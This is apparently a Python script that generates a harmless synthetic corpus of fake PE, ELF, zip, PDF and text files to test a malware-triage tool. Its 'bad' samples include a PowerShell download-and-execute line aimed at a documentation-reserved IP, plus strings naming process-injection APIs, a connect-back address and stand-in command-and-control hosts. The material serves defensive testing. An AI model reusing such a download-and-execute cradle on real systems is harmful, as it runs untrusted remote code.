"""Generate a synthetic, harmless test corpus for `triage`.

Nothing here is malware: "PE" and "ELF" files are bare headers plus strings, every
URL/IP uses documentation-reserved ranges (example.com/.net/.org, 192.0.2.0/24,
198.51.100.0/24), and "bad" files are bad only because they carry MARKER.

    python make_corpus.py [--out corpus] [--with-large]
"""

from __future__ import annotations

import argparse
import io
import os
import random
import shutil
import struct
import sys
import zipfile
from pathlib import Path

MARKER = b"TRIAGE-SYNTHETIC-MARKER-7f3a"
SENTINEL = ".triage-corpus"
SEED = 1337
LARGE_SIZE = 51 * 1024 * 1024


def fake_pe(*strings: bytes, wide: tuple[str, ...] = ()) -> bytes:
    """DOS header + stub + PE signature + COFF/optional header magic, then strings."""
    e_lfanew = 0x80
    dos = bytearray(e_lfanew)
    dos[:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, e_lfanew)
    stub = b"This program cannot be run in DOS mode.\r\r\n$"
    dos[0x40:0x40 + len(stub)] = stub
    # Machine i386, 1 section, SizeOfOptionalHeader 0xE0, EXECUTABLE_IMAGE|32BIT_MACHINE.
    coff = struct.pack("<4sHHIIIHH", b"PE\x00\x00", 0x014C, 1, 0, 0, 0, 0xE0, 0x0102)
    optional = struct.pack("<H", 0x010B) + bytes(0xE0 - 2)
    body = b"\x00".join(strings) + b"\x00" + b"".join(s.encode("utf-16-le") + b"\x00\x00" for s in wide)
    return bytes(dos) + coff + optional + bytes(64) + body


def fake_elf(*strings: bytes) -> bytes:
    """64-bit little-endian ELF header (x86-64 executable) followed by strings."""
    ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + bytes(8)
    header = ident + struct.pack(
        "<HHIQQQIHHHHHH", 2, 0x3E, 1, 0x401000, 64, 0, 0, 64, 56, 0, 64, 0, 0
    )
    return header + bytes(64) + b"\x00".join(strings) + b"\x00"


def make_zip(members: dict[str, bytes], compression: int = zipfile.ZIP_DEFLATED) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=compression) as zf:
        for name, content in members.items():
            # Fixed timestamp keeps the archive byte-for-byte reproducible.
            zf.writestr(zipfile.ZipInfo(name, date_time=(2026, 1, 1, 0, 0, 0)), content)
    return buf.getvalue()


def fake_pdf(text: str) -> bytes:
    return (
        b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
        b"1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
        b"2 0 obj << /Type /Pages /Kids [] /Count 0 >> endobj\n"
        + f"% {text}\n".encode()
        + b"trailer << /Root 1 0 R >>\n%%EOF\n"
    )


def good_files(rng: random.Random) -> dict[str, bytes]:
    return {
        "calc_like.exe": fake_pe(
            b"KERNEL32.dll", b"GetProcAddress", b"LoadLibraryA",
            wide=("Calculator", "FileVersion 10.0.1.2"),
        ),
        "tool.elf": fake_elf(b"/lib64/ld-linux-x86-64.so.2", b"libc.so.6", b"GLIBC_2.34", b"main"),
        "photos.zip": make_zip({"a.txt": b"holiday notes\n" * 50, "b.txt": b"shopping list\n" * 50}),
        "manual.pdf": fake_pdf("User manual for the example product"),
        "random.bin": rng.randbytes(64 * 1024),
        "notes.txt": (
            b"Meeting notes\n"
            b"Docs live at http://example.com/docs and https://example.org/wiki/start.\n"
            b"Staging server: 192.0.2.10 (ssh), backup host 198.51.100.20.\n"
            b"We upgraded to version 1.2.3.4 last week; see changelog.md and setup.py.\n"
            b"Contact: ops@example.net\n"
        ),
        "install.sh": (
            b"#!/bin/sh\nset -eu\n"
            b"echo 'installing example tool'\n"
            b"curl -fsSL https://example.com/tool.tar.gz -o /tmp/tool.tar.gz\n"
        ),
        "empty.txt": b"",
    }


def bad_files(rng: random.Random) -> dict[str, bytes]:
    return {
        "dropper.exe": fake_pe(
            MARKER, b"VirtualAlloc", b"WriteProcessMemory", b"CreateRemoteThread",
            b"http://bad-example.com/stage2.bin", b"198.51.100.23",
            wide=("cmd.exe /c whoami", "update.bad-example.net"),
        ),
        "implant.elf": fake_elf(MARKER, b"/bin/sh", b"connect-back 203.0.113.9", b"c2.bad-example.org"),
        "loader.ps1": (
            b"$u = 'http://198.51.100.23/payload.bin'\n"
            b"# " + MARKER + b"\n"
            b"Invoke-Expression (New-Object Net.WebClient).DownloadString($u)\n"
        ),
        # Stored, not deflated, so the marker stays visible to string/YARA matching.
        "invoice.zip": make_zip({"invoice.txt": b"pay now\n" + MARKER + b"\n"}, zipfile.ZIP_STORED),
        "packed.bin": rng.randbytes(32 * 1024) + MARKER + rng.randbytes(32 * 1024),
        "readme.txt": b"This file is flagged only because it contains " + MARKER + b".\n",
    }


def _prepare_out_dir(out: Path) -> None:
    if out.exists():
        if not (out / SENTINEL).exists():
            raise SystemExit(
                f"refusing to overwrite {out}: it exists and was not created by make_corpus.py"
            )
        unreadable = out / "good" / "unreadable.txt"
        if unreadable.exists():
            unreadable.chmod(0o644)
        shutil.rmtree(out)
    out.mkdir(parents=True)
    (out / SENTINEL).write_text("created by make_corpus.py; safe to delete\n")


def build_corpus(out: Path, with_large: bool = False) -> dict[str, list[Path]]:
    """Write corpus/good and corpus/bad under `out`. Returns the paths written."""
    out = Path(out)
    _prepare_out_dir(out)
    rng = random.Random(SEED)
    written: dict[str, list[Path]] = {"good": [], "bad": []}
    for group, files in (("good", good_files(rng)), ("bad", bad_files(rng))):
        (out / group).mkdir()
        for name, content in files.items():
            path = out / group / name
            path.write_bytes(content)
            written[group].append(path)

    unreadable = out / "good" / "unreadable.txt"
    unreadable.write_bytes(b"you should not be able to read this\n")
    unreadable.chmod(0o000)
    written["good"].append(unreadable)

    if with_large:
        large = out / "good" / "large.bin"
        with large.open("wb") as f:
            f.truncate(LARGE_SIZE)  # sparse: takes ~no disk space
        written["good"].append(large)
    return written


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--out", default="corpus", type=Path, help="output directory (default: corpus)")
    parser.add_argument(
        "--with-large", action="store_true", help="also write a 51 MB sparse file to test the size limit"
    )
    args = parser.parse_args(argv)
    written = build_corpus(args.out, with_large=args.with_large)
    for group, paths in written.items():
        print(f"{group}: {len(paths)} files in {args.out / group}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
